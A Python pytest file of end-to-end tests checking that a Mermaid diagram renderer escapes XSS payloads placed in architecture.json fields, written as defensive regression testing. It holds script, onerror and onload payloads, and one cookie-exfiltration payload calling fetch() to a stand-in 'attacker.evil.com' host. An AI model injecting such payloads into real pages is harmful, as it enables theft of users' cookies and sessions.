"""
E2E Test for Issue #411: XSS Vulnerability in Mermaid Diagram Tooltips

Tests the full user-facing workflow for generating Mermaid diagrams from
architecture.json files, verifying XSS payloads are properly escaped.
"""

import pytest
import json
import subprocess
import sys
from pathlib import Path


class TestIssue411E2EWorkflow:
    """
    E2E tests for Issue #411: Full workflow from malicious JSON to safe HTML.
    """

    def test_cli_workflow_escapes_all_xss_payloads(self, tmp_path):
        """
        E2E test: Full CLI workflow from malicious architecture.json to safe HTML.

        Simulates real user workflow:
        1. Create architecture.json with XSS payloads in all fields
        2. Run render_mermaid.py CLI
        3. Verify generated HTML is safe
        """
        # Create malicious architecture.json with XSS in all vulnerable fields
        malicious_architecture = [
            {
                "filename": "test<img src=x onerror=alert('XSS-filename')>.py",
                "description": "Normal<script>alert('XSS-desc')</script>",
                "tags": ["api", "<img src=x onerror=alert('XSS-tags')>"],
                "dependencies": ["utils<script>alert('XSS-deps')</script>"],
                "filepath": "/src/test<svg onload=alert('XSS-path')>.py",
                "priority": "high<img src=x onerror=alert('XSS-pri')>",
            },
            {
                "filename": "safe_module.py",
                "description": "Safe module",
                "tags": ["backend"],
            }
        ]

        arch_file = tmp_path / "malicious_architecture.json"
        arch_file.write_text(json.dumps(malicious_architecture, indent=2))
        output_file = tmp_path / "xss_test_diagram.html"

        # Run CLI
        result = subprocess.run(
            [sys.executable, "-m", "pdd.render_mermaid",
             str(arch_file), "XSS Test App", str(output_file)],
            capture_output=True,
            text=True,
            cwd=Path(__file__).parent.parent
        )

        assert result.returncode == 0, f"CLI failed: {result.stderr}"
        assert output_file.exists(), "Output file not created"

        html_content = output_file.read_text(encoding='utf-8')

        # Verify ALL XSS payloads are escaped
        xss_payloads = [
            "<img src=x onerror=alert('XSS-filename')>",
            "<script>alert('XSS-desc')</script>",
            "<img src=x onerror=alert('XSS-tags')>",
            "<script>alert('XSS-deps')</script>",
            "<svg onload=alert('XSS-path')>",
            "<img src=x onerror=alert('XSS-pri')>",
        ]

        for payload in xss_payloads:
            assert payload not in html_content, \
                f"XSS payload should be escaped: {payload}"

        # Verify escaped versions are present
        assert "&lt;" in html_content or "\\u003c" in html_content, \
            "Escaped < characters should be present"

    def test_data_exfiltration_attack_prevented(self):
        """
        Critical security test: Verify cookie/token stealing attacks are prevented.

        Simulates realistic attack where malicious architecture.json attempts to
        exfiltrate browser cookies via fetch() when HTML is opened.

        Attack scenario:
        1. Attacker submits PR with malicious architecture.json
        2. Maintainer runs render_mermaid.py to visualize architecture
        3. Maintainer opens HTML file in browser
        4. Expected: XSS is neutralized, no data exfiltration occurs
        """
        from pdd.render_mermaid import generate_html, generate_mermaid_code

        # Realistic data exfiltration payload
        exfiltration_payload = (
            "test<img src=x onerror=\""
            "fetch('https://attacker.evil.com/steal?data='+document.cookie)\">"
        )

        architecture = [{
            "filename": exfiltration_payload,
            "description": "Legitimate-looking module description",
            "tags": ["api"],
            "dependencies": [],
            "filepath": "/src/api/authentication.py",
            "priority": "critical",
        }]

        html_content = generate_html(
            generate_mermaid_code(architecture, "Authentication Service"),
            architecture,
            "Authentication Service"
        )

        # Critical: fetch() call should NOT be present in executable form
        assert "fetch('https://attacker.evil.com" not in html_content, \
            "Data exfiltration payload should be neutralized"

        # Verify payload is escaped
        assert "&lt;img" in html_content or "\\u003cimg" in html_content, \
            "XSS payload should be HTML-escaped"

    def test_programmatic_api_escapes_xss(self):
        """
        E2E test: Direct Python API usage produces safe HTML.

        Verifies that importing and using render_mermaid functions directly
        also produces secure output.
        """
        from pdd.render_mermaid import generate_html, generate_mermaid_code

        architecture = [
            {
                "filename": "xss<script>alert('XSS')</script>.py",
                "description": "Malicious<img src=x onerror=alert(1)>",
                "tags": ["<svg onload=alert(2)>"],
                "priority": "high<img src=x onerror=alert(3)>",
            }
        ]

        app_name = "Test App"
        mermaid_code = generate_mermaid_code(architecture, app_name)
        html_content = generate_html(mermaid_code, architecture, app_name)

        # Verify all XSS payloads are escaped
        assert "<script>alert('XSS')</script>" not in html_content
        assert "<img src=x onerror=alert(1)>" not in html_content
        assert "<svg onload=alert(2)>" not in html_content
        assert "<img src=x onerror=alert(3)>" not in html_content

        # Verify escaping is present
        assert "&lt;" in html_content or "\\u003c" in html_content
